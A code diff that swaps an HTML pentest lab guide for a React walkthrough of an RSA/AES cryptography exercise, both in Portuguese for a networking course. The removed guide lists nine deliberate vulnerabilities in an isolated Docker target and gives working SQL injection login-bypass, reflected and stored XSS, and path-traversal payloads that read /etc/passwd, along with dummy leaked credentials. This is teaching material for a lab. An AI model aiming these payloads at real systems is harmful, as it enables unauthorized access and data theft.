-            <div class="cl"><span class="pr2">PS&gt;</span><span class="cm"><span class="kw">docker-compose</span> <span class="sub">ps</span></span></div>
-            <div class="desc">Verifica o status de todos os containers do lab.</div>
-          </div>
+function StepCard({ step, ativo, onClick }) {
+  return (
+    <div onClick={onClick} style={{
+      border: `1.5px solid ${ativo ? "var(--color-border-primary)" : "var(--color-border-tertiary)"}`,
+      borderRadius: 12, padding: "14px 16px", marginBottom: 8,
+      cursor: "pointer",
+      background: ativo ? "var(--color-background-secondary)" : "transparent",
+      transition: "all 0.15s",
+    }}>
+      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+        <span style={{
+          width: 26, height: 26, borderRadius: "50%", flexShrink: 0,
+          background: ativo ? "var(--color-text-primary)" : "var(--color-background-secondary)",
+          color: ativo ? "var(--color-background-primary)" : "var(--color-text-secondary)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          fontSize: 12, fontWeight: 600,
+        }}>{step.num}</span>
+        <span style={{ fontSize: 14, fontWeight: 500, color: "var(--color-text-primary)" }}>
+          {step.emoji} {step.titulo}
+        </span>
+      </div>
+
+      {ativo && (
+        <div style={{ marginTop: 14 }}>
+          <p style={{ fontSize: 13, color: "var(--color-text-secondary)", lineHeight: 1.65, margin: "0 0 14px" }}>
+            {step.descricao}
+          </p>
+          {step.blocos.map((b, i) => <Bloco key={i} b={b} />)}
         </div>
-      </div>
-      <div class="tip"><strong>💡 ACESSO AO SITE ALVO</strong>Abra o browser e acesse <strong>http://localhost:8080</strong> — você verá o Portal UMC Lab rodando. Este é o alvo principal da atividade!</div>
+      )}
     </div>
+  );
+}
 
-    <div class="step">
-      <div class="shdr"><div class="sn">0.2</div><div class="st2">Entrar no Kali para iniciar os ataques</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>POWERSHELL — HOST</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">PS&gt;</span><span class="cm"><span class="kw">docker</span> <span class="sub">exec</span> <span class="fl">-it</span> <span class="val">kali-atacante</span> <span class="sub">bash</span></span></div>
-            <div class="desc">Entra no terminal do Kali Linux. As ferramentas já foram instaladas automaticamente pelo docker-compose.</div>
-          </div>
-          <div class="out g">root@kali-atacante:/# ← você está no Kali!</div>
+export default function App() {
+  const [fase, setFase] = useState("setup");
+  const [stepAtivo, setStepAtivo] = useState(0);
+
+  const fases = { setup: SETUP, ato1: ATO1, ato2: ATO2 };
+  const steps = fases[fase];
+
+  const avancar = () => {
+    if (stepAtivo < steps.length - 1) { setStepAtivo(s => s + 1); return; }
+    if (fase === "setup") { setFase("ato1"); setStepAtivo(0); }
+    else if (fase === "ato1") { setFase("ato2"); setStepAtivo(0); }
+  };
+  const voltar = () => {
+    if (stepAtivo > 0) { setStepAtivo(s => s - 1); return; }
+    if (fase === "ato1") { setFase("setup"); setStepAtivo(SETUP.length - 1); }
+    else if (fase === "ato2") { setFase("ato1"); setStepAtivo(ATO1.length - 1); }
+  };
+  const fimDeTudo = fase === "ato2" && stepAtivo === ATO2.length - 1;
+  const temProximo = stepAtivo < steps.length - 1 || fase !== "ato2";
+
+  const FASES = [
+    { id: "setup", label: "⚙️ Configuração" },
+    { id: "ato1",  label: "🔑 Ato 1 — RSA" },
+    { id: "ato2",  label: "🔐 Ato 2 — AES" },
+  ];
+
+  return (
+    <div style={{ maxWidth: 680, margin: "0 auto", padding: "20px 16px", fontFamily: "var(--font-sans)" }}>
+
+      <div style={{ marginBottom: 18 }}>
+        <div style={{ fontSize: 11, fontWeight: 500, color: "var(--color-text-secondary)", letterSpacing: "0.05em", marginBottom: 4 }}>
+          ATIVIDADE PRÁTICA — REDES DE COMPUTADORES
         </div>
+        <h1 style={{ fontSize: 20, fontWeight: 500, color: "var(--color-text-primary)", margin: "0 0 4px" }}>
+          Criptografia com Docker + Python
+        </h1>
+        <p style={{ fontSize: 13, color: "var(--color-text-secondary)", margin: 0 }}>
+          Passo a passo completo com comandos, outputs esperados e desafios.
+        </p>
+      </div>
+
+      {/* Seletor de fase */}
+      <div style={{ display: "flex", gap: 6, marginBottom: 16 }}>
+        {FASES.map(f => (
+          <button key={f.id} onClick={() => { setFase(f.id); setStepAtivo(0); }} style={{
+            flex: 1, padding: "8px 4px", borderRadius: 8, fontSize: 12, cursor: "pointer",
+            border: `1.5px solid ${fase === f.id ? "var(--color-border-primary)" : "var(--color-border-tertiary)"}`,
+            background: fase === f.id ? "var(--color-background-secondary)" : "transparent",
+            color: fase === f.id ? "var(--color-text-primary)" : "var(--color-text-secondary)",
+            fontWeight: fase === f.id ? 500 : 400,
+          }}>{f.label}</button>
+        ))}
+      </div>
+
+      {/* Barra de progresso */}
+      <div style={{ display: "flex", gap: 3, marginBottom: 16, alignItems: "center" }}>
+        {steps.map((_, i) => (
+          <div key={i} onClick={() => setStepAtivo(i)} style={{
+            flex: 1, height: 4, borderRadius: 2, cursor: "pointer",
+            background: i <= stepAtivo ? "var(--color-border-primary)" : "var(--color-border-tertiary)",
+            transition: "background 0.2s",
+          }} />
+        ))}
+        <span style={{ fontSize: 11, color: "var(--color-text-secondary)", marginLeft: 6, whiteSpace: "nowrap" }}>
+          {stepAtivo + 1}/{steps.length}
+        </span>
+      </div>
+
+      {/* Steps */}
+      {steps.map((step, i) => (
+        <StepCard key={i} step={step} ativo={i === stepAtivo} onClick={() => setStepAtivo(i)} />
+      ))}
+
+      {/* Navegação */}
+      <div style={{ display: "flex", gap: 8, marginTop: 14 }}>
+        <button onClick={voltar} disabled={fase === "setup" && stepAtivo === 0} style={{
+          flex: 1, padding: "10px 0", borderRadius: 10,
+          border: "1.5px solid var(--color-border-tertiary)", background: "transparent",
+          color: (fase === "setup" && stepAtivo === 0) ? "var(--color-text-tertiary)" : "var(--color-text-primary)",
+          fontSize: 13, cursor: (fase === "setup" && stepAtivo === 0) ? "default" : "pointer",
+        }}>← Anterior</button>
+
+        {!fimDeTudo ? (
+          <button onClick={avancar} style={{
+            flex: 2, padding: "10px 0", borderRadius: 10, border: "none",
+            background: "var(--color-text-primary)", color: "var(--color-background-primary)",
+            fontSize: 13, fontWeight: 500, cursor: "pointer",
+          }}>
+            {stepAtivo < steps.length - 1
+              ? "Próximo passo →"
+              : fase === "setup" ? "Iniciar Ato 1 — RSA →"
+              : "Ir para Ato 2 — AES →"}
+          </button>
+        ) : (
+          <div style={{
+            flex: 2, padding: "10px 0", borderRadius: 10, textAlign: "center",
+            background: "var(--color-background-secondary)",
+            border: "1.5px solid var(--color-border-tertiary)",
+            fontSize: 13, color: "var(--color-text-secondary)",
+          }}>✅ Atividade concluída!</div>
+        )}
       </div>
     </div>
-  </div>
-</div>
-
-
-<!-- ══════ MAPA DE VULNERABILIDADES ══════ -->
-<div class="sec">MAPA DE VULNERABILIDADES — SITE UMC LAB</div>
-
-<div class="blk">
-  <div class="blk-hdr">
-    <div class="num c">MAP</div>
-    <div class="blk-info">
-      <h2>9 Vulnerabilidades Intencionais — Guia</h2>
-      <p>Referência completa para acompanhar o quevcs vão encontrar em cada fase.</p>
-    </div>
-  </div>
-  <div class="blk-body">
-    <table class="vtable">
-      <thead>
-        <tr><th>#</th><th>VULNERABILIDADE</th><th>ONDE ENCONTRAR</th><th>SEVERI-DADE</th><th>EQUIVALENTE REAL</th></tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>V1</td>
-          <td>Credenciais nos comentários HTML</td>
-          <td><span class="path">/ (view-source)</span></td>
-          <td><span class="sv c">CRÍTICO</span></td>
-          <td>Hardcoded credentials — CWE-798</td>
-        </tr>
-        <tr>
-          <td>V2</td>
-          <td>XSS Refletido — campo de busca</td>
-          <td><span class="path">/index.php?q=&lt;script&gt;</span></td>
-          <td><span class="sv h">ALTO</span></td>
-          <td>Cross-Site Scripting — CWE-79</td>
-        </tr>
-        <tr>
-          <td>V3</td>
-          <td>SQL Injection — formulário busca</td>
-          <td><span class="path">/busca.php?q=' OR '1'='1</span></td>
-          <td><span class="sv c">CRÍTICO</span></td>
-          <td>SQL Injection — CWE-89</td>
-        </tr>
-        <tr>
-          <td>V4</td>
-          <td>LFI — inclusão de arquivo local</td>
-          <td><span class="path">/busca.php?page=../../../etc/passwd</span></td>
-          <td><span class="sv c">CRÍTICO</span></td>
-          <td>Path Traversal / LFI — CWE-22</td>
-        </tr>
-        <tr>
-          <td>V5</td>
-          <td>XSS Persistente — comentários</td>
-          <td><span class="path">/comentarios.php</span></td>
-          <td><span class="sv h">ALTO</span></td>
-          <td>Stored XSS — CWE-79</td>
-        </tr>
-        <tr>
-          <td>V6</td>
-          <td>Upload sem validação real</td>
-          <td><span class="path">/upload.php</span></td>
-          <td><span class="sv h">ALTO</span></td>
-          <td>Unrestricted File Upload — CWE-434</td>
-        </tr>
-        <tr>
-          <td>V7</td>
-          <td>Painel admin sem autenticação</td>
-          <td><span class="path">/admin/</span></td>
-          <td><span class="sv c">CRÍTICO</span></td>
-          <td>Broken Access Control — OWASP A01</td>
-        </tr>
-        <tr>
-          <td>V8</td>
-          <td>Diretório /backup/ exposto com senhas</td>
-          <td><span class="path">/backup/config.bak</span></td>
-          <td><span class="sv c">CRÍTICO</span></td>
-          <td>Sensitive Data Exposure — CWE-538</td>
-        </tr>
-        <tr>
-          <td>V9</td>
-          <td>Cabeçalhos HTTP de segurança ausentes</td>
-          <td><span class="path">HTTP Headers (curl -I)</span></td>
-          <td><span class="sv m">MÉDIO</span></td>
-          <td>Security Misconfiguration — OWASP A05</td>
-        </tr>
-      </tbody>
-    </table>
-  </div>
-</div>
-
-
-<!-- ══════ FASE 1 ══════ -->
-<div class="sec">FASE 1 — RECONHECIMENTO (NMAP + WHATWEB)</div>
-
-<div class="blk">
-  <div class="blk-hdr">
-    <div class="num">01</div>
-    <div class="blk-info">
-      <h2>Mapear o alvo — portas, serviços e tecnologias</h2>
-      <p>Use nmap e whatweb para descobrir o que está rodando no site UMC Lab antes de atacar.</p>
-      <div class="tags"><span class="tag tg">nmap</span><span class="tag tc">whatweb</span><span class="tag to">curl</span></div>
-    </div>
-    <div class="tm">⏱ 15 min</div>
-  </div>
-  <div class="blk-body">
-
-    <div class="step">
-      <div class="shdr"><div class="sn">1.1</div><div class="st2">Varredura de portas no site UMC</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">nmap</span> <span class="fl">-sV</span> <span class="fl">-sC</span> <span class="fl">--script</span> <span class="val">http-headers,http-title,http-methods</span> <span class="ip">192.168.100.10</span> <span class="fl">-oN</span> <span class="val">/tmp/scan-umc.txt</span></span></div>
-            <div class="desc"><span class="g">-sV</span> detecta versões · <span class="c">-sC</span> scripts padrão · <span class="o">--script http-*</span> scripts específicos para HTTP · <span class="hi">-oN</span> salva resultado.</div>
-          </div>
-          <div class="out c">PORT   STATE SERVICE VERSION</div>
-          <div class="out g">80/tcp open  http    Apache httpd 2.4.29</div>
-          <div class="out y">| http-title: UMC Lab — Portal Acadêmico</div>
-          <div class="out y">| http-methods: GET HEAD POST OPTIONS</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">1.2</div><div class="st2">Fingerprint de tecnologias com WhatWeb</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">whatweb</span> <span class="fl">-v</span> <span class="val">http://192.168.100.10</span></span></div>
-            <div class="desc">Detecta automaticamente: servidor, linguagem, versões, cookies e frameworks.</div>
-          </div>
-          <div class="out g">http://192.168.100.10 [200 OK]</div>
-          <div class="out y">Apache[2.4.29], PHP[7.2.1], X-Powered-By[PHP/7.2.1]</div>
-          <div class="out r">← PHP 7.2 é EOL (sem suporte desde 2019)! Vulnerabilidade!</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">1.3</div><div class="st2">Inspecionar cabeçalhos HTTP (V9)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">curl</span> <span class="fl">-I</span> <span class="val">http://192.168.100.10</span></span></div>
-            <div class="desc">Retorna apenas os cabeçalhos HTTP. Procure por cabeçalhos de segurança <strong>ausentes</strong>.</div>
-          </div>
-          <div class="out c">HTTP/1.1 200 OK</div>
-          <div class="out c">Server: Apache/2.4.29 (Ubuntu)</div>
-          <div class="out c">X-Powered-By: PHP/7.2.1</div>
-          <div class="out r">← AUSENTE: Strict-Transport-Security (HSTS)</div>
-          <div class="out r">← AUSENTE: Content-Security-Policy (CSP)</div>
-          <div class="out r">← AUSENTE: X-Frame-Options</div>
-          <div class="out r">← AUSENTE: X-Content-Type-Options</div>
-        </div>
-      </div>
-      <div class="tip"><strong>💡 ACHADO V9</strong>4 cabeçalhos de segurança ausentes = vulnerabilidade de configuração. Anote todos no relatório como criticidade MÉDIO.</div>
-    </div>
-
-  </div>
-</div>
-
-
-<!-- ══════ FASE 2 ══════ -->
-<div class="sec">FASE 2 — DESCOBERTA DE DIRETÓRIOS (DIRB + NIKTO)</div>
-
-<div class="blk">
-  <div class="blk-hdr">
-    <div class="num">02</div>
-    <div class="blk-info">
-      <h2>Encontrar /admin/, /backup/ e arquivos ocultos</h2>
-      <p>Use dirb e nikto para descobrir diretórios que não estão linkados no site mas existem no servidor.</p>
-      <div class="tags"><span class="tag tr">dirb</span><span class="tag to">nikto</span><span class="tag ty">/admin/ /backup/</span></div>
-    </div>
-    <div class="tm">⏱ 15 min</div>
-  </div>
-  <div class="blk-body">
-
-    <div class="step">
-      <div class="shdr"><div class="sn">2.1</div><div class="st2">Descoberta de diretórios com Dirb</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">dirb</span> <span class="val">http://192.168.100.10</span> <span class="fl">-o</span> <span class="val">/tmp/dirb-umc.txt</span></span></div>
-            <div class="desc">Testa centenas de nomes comuns de diretórios e arquivos. Salva resultado para o relatório.</div>
-          </div>
-          <div class="out g">+ http://192.168.100.10/admin/ (CODE:200)</div>
-          <div class="out g">+ http://192.168.100.10/backup/ (CODE:200)</div>
-          <div class="out g">+ http://192.168.100.10/uploads/ (CODE:200)</div>
-          <div class="out g">+ http://192.168.100.10/login.php (CODE:200)</div>
-        </div>
-      </div>
-      <div class="warn"><strong>🚨 ACHADOS V7 + V8</strong>Diretórios <strong>/admin/</strong> e <strong>/backup/</strong> acessíveis! Acesse pelo browser do host: <strong>http://localhost:8080/admin/</strong> e <strong>http://localhost:8080/backup/</strong></div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">2.2</div><div class="st2">Scanner de vulnerabilidades com Nikto</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">nikto</span> <span class="fl">-h</span> <span class="val">http://192.168.100.10</span> <span class="fl">-o</span> <span class="val">/tmp/nikto-umc.txt</span></span></div>
-            <div class="desc">Testa mais de 6700 problemas conhecidos. Gera uma lista de achados para o relatório.</div>
-          </div>
-          <div class="out r">+ /backup/: Directory indexing found</div>
-          <div class="out r">+ /admin/: Admin directory accessible without auth</div>
-          <div class="out r">+ PHP/7.2.1 appears to be outdated</div>
-          <div class="out r">+ No X-Frame-Options header</div>
-          <div class="out r">+ Cookie PHPSESSID without HttpOnly flag</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">2.3</div><div class="st2">Acessar /backup/ e baixar config.bak (V8)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">curl</span> <span class="val">http://192.168.100.10/backup/config.bak</span></span></div>
-            <div class="desc">Faz o download do arquivo de configuração exposto. Contém credenciais de banco de dados, chaves de API e senhas SMTP.</div>
-          </div>
-          <div class="out r">db_pass = root123</div>
-          <div class="out r">smtp_password = Smtp@UMC2026!</div>
-          <div class="out r">api_key = sk-umc-lab-2026-api-key-x7f9k2m4n8</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">2.4</div><div class="st2">Encontrar credenciais no código-fonte (V1)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">curl</span> <span class="val">http://192.168.100.10</span> <span class="fl">|</span> <span class="kw">grep</span> <span class="fl">-i</span> <span class="val">"pass\|senha\|pwd\|TODO\|admin"</span></span></div>
-            <div class="desc">Baixa o HTML da página e filtra por palavras que indicam credenciais em comentários.</div>
-          </div>
-          <div class="out r">admin_user: admin  ← credencial no comentário HTML!</div>
-          <div class="out r">admin_pass: admin123</div>
-        </div>
-      </div>
-    </div>
-
-  </div>
-</div>
-
-
-<!-- ══════ FASE 3 ══════ -->
-<div class="sec">FASE 3 — EXPLORAÇÃO DE VULNERABILIDADES WEB</div>
-
-<div class="blk">
-  <div class="blk-hdr">
-    <div class="num r">03</div>
-    <div class="blk-info">
-      <h2>SQLi, XSS e LFI no site UMC Lab</h2>
-      <p>Explore as vulnerabilidades encontradas. Cada teste demonstra uma classe de ataque real.</p>
-      <div class="tags"><span class="tag tr">SQLi</span><span class="tag tr">XSS</span><span class="tag tr">LFI</span><span class="tag to">bypass login</span></div>
-    </div>
-    <div class="tm">⏱ 30 min</div>
-  </div>
-  <div class="blk-body">
-
-    <div class="step">
-      <div class="shdr"><div class="sn">3.1</div><div class="st2">SQL Injection — bypass de login (V3)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>BROWSER — http://localhost:8080/login.php</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">Usuário:</span><span class="cm"><span class="val">' OR '1'='1</span></span></div>
-            <div class="desc">Este payload faz a query SQL virar sempre verdadeira. A lógica: <code style="color:var(--orange)">WHERE usuario='' OR '1'='1' AND senha='...'</code></div>
-          </div>
-          <div class="cb">
-            <div class="cl"><span class="pr2">Senha:</span><span class="cm"><span class="val">qualquer coisa</span></span></div>
-          </div>
-          <div class="out g">→ Login realizado! Redirecionado para dashboard.php</div>
-        </div>
-      </div>
-      <div class="tip"><strong>💡 TAMBÉM FUNCIONA NO KALI</strong>
-        <code style="font-family:'Share Tech Mono',monospace;color:var(--green)">curl -X POST http://192.168.100.10/login.php -d "usuario=' OR '1'='1&senha=x" -v</code>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">3.2</div><div class="st2">XSS Refletido — campo de busca (V2)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>BROWSER OU KALI</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">URL:</span><span class="cm"><span class="val">http://localhost:8080/index.php?q=</span><span class="fl">&lt;script&gt;alert('XSS UMC')&lt;/script&gt;</span></span></div>
-            <div class="desc">O input é refletido sem sanitização no HTML. O browser executa o JavaScript injetado.</div>
-          </div>
-          <div class="out r">→ Pop-up com "XSS UMC" aparece no browser!</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">3.3</div><div class="st2">XSS Persistente — comentários (V5)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>BROWSER — http://localhost:8080/comentarios.php</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">Comentário:</span><span class="cm"><span class="fl">&lt;img src=x onerror="alert('XSS Persistente')"&gt;</span></span></div>
-            <div class="desc">Enviado via formulário. O script fica salvo e executa para TODOS que visitam a página — mais perigoso que o refletido.</div>
-          </div>
-          <div class="out r">→ Alert dispara para qualquer pessoa que abrir /comentarios.php!</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="shdr"><div class="sn">3.4</div><div class="st2">LFI — Local File Inclusion (V4)</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>KALI — root@kali-atacante</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">curl</span> <span class="val">"http://192.168.100.10/busca.php?page=../../../etc/passwd"</span></span></div>
-            <div class="desc">Path traversal: navega para fora do webroot usando <span class="o">../</span> e inclui o arquivo de usuários do Linux.</div>
-          </div>
-          <div class="out r">root:x:0:0:root:/root:/bin/bash</div>
-          <div class="out r">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div>
-          <div class="out r">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div>
-          <div class="out r">← conteúdo do /etc/passwd do container!</div>
-        </div>
-      </div>
-    </div>
-
-  </div>
-</div>
-
-
-<!-- ══════ ENCERRAR ══════ -->
-<div class="sec">ENCERRAMENTO DO LABORATÓRIO</div>
-
-<div class="blk">
-  <div class="blk-hdr">
-    <div class="num o">END</div>
-    <div class="blk-info">
-      <h2>Salvar evidências e derrubar o lab</h2>
-    </div>
-    <div class="tm">⏱ 5 min</div>
-  </div>
-  <div class="blk-body">
-    <div class="step">
-      <div class="shdr"><div class="sn">FIM</div><div class="st2">Copiar relatórios e encerrar tudo</div></div>
-      <div class="term">
-        <div class="tbar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><span>POWERSHELL — HOST</span></div>
-        <div class="tbody">
-          <div class="cb">
-            <div class="cl"><span class="pr2">root@kali#</span><span class="cm"><span class="kw">cat</span> <span class="val">/tmp/scan-umc.txt /tmp/nikto-umc.txt /tmp/dirb-umc.txt</span> <span class="fl">&gt;</span> <span class="val">/tmp/relatorio-completo.txt</span></span></div>
-            <div class="desc">Concatena todos os arquivos de saída das ferramentas em um único arquivo de evidências.</div>
-          </div>
-          <div class="cb">
-            <div class="cl"><span class="pr2">PS&gt;</span><span class="cm"><span class="kw">docker</span> <span class="sub">cp</span> <span class="val">kali-atacante:/tmp/relatorio-completo.txt</span> <span class="val">C:\umc-pentest-lab\relatorio-evidencias.txt</span></span></div>
-            <div class="desc"><span class="hi">docker cp</span> copia o arquivo de dentro do container para o Windows — assim o aluno tem as evidências para anexar ao relatório.</div>
-          </div>
-          <div class="cb">
-            <div class="cl"><span class="pr2">PS&gt;</span><span class="cm"><span class="kw">docker-compose</span> <span class="fl">-f</span> <span class="val">compose/docker-compose.yml</span> <span class="sub">down</span></span></div>
-            <div class="desc">Para e remove todos os containers do lab com um único comando.</div>
-          </div>
-          <div class="out g">✔ Container kali-atacante       Removed</div>
-          <div class="out g">✔ Container alvo-umc-site        Removed</div>
-          <div class="out g">✔ Container alvo-metasploitable  Removed</div>
-          <div class="out g">✔ Network pentest-lab             Removed</div>
-        </div>
-      </div>
-    </div>
-
-    <hr class="dv">
-    <p style="font-size:.79rem;color:var(--muted);margin-bottom:10px;font-family:'Share Tech Mono',monospace;letter-spacing:.05em">✅ CHECKLIST — ENTREGA DO RELATÓRIO</p>
-    <ul class="cll">
-      <li><span>Container atacante identificado (kalilinux/kali-rolling) e versão documentada</span></li>
-      <li><span>Ferramentas listadas: nmap, whatweb, curl, dirb, nikto com finalidade de cada uma</span></li>
-      <li><span>Todas as portas abertas do alvo UMC (porta 80, serviços, versões)</span></li>
-      <li><span>Pelo menos 5 das 9 vulnerabilidades descritas com localização e evidência</span></li>
-      <li><span>Cada vulnerabilidade classificada por severidade (Crítico/Alto/Médio/Baixo)</span></li>
-      <li><span>Arquivo relatorio-evidencias.txt anexado (saídas do nmap, nikto, dirb)</span></li>
-      <li><span>Pelo menos 4 recomendações de correção escritas</span></li>
-      <li><span>Conclusão pessoal: o que aprendeu, o que surpreendeu</span></li>
-    </ul>
-  </div>
-</div>
-
-<div class="footer">
-  UMC Pentest Lab — Ambiente 100% isolado para fins educacionais<br>
-  <span>HACK THE LAB · PROTECT THE WORLD · docker-compose up -d</span>
-</div>
-
-</div>
-</body>
-</html>
+  );
+}
